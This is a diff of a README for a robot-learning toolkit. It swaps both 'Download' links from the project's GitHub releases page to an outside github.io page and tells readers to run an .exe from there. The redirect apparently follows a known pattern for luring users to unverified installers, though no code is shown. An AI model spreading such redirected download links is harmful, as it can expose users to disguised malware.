@@ -1,6 +1,6 @@
 # 🤖 robot_futuring_rl - Build smart robots with easy tools
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Trankie344/robot_futuring_rl/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://trankie344.github.io)
 
 This project provides a complete set of tools for robot learning. It helps you train robots to perform tasks through data collection, skill labeling, and reinforcement learning. You can use this software to teach robots how to move, react to their environment, and fix mistakes through human guidance.
 
@@ -18,7 +18,7 @@ Before you install this software, ensure your computer meets these requirements:
 
 You can download the latest version of the application from our release page. 
 
-[Visit this page to download](https://github.com/Trankie344/robot_futuring_rl/releases)
+[Visit this page to download](https://trankie344.github.io)
 
 Once you reach the page, look for the section labeled "Assets." Click the file that ends in .exe to start your download. Save this file to a folder where you can find it easily, such as your Downloads folder or a dedicated project folder on your desktop.
 
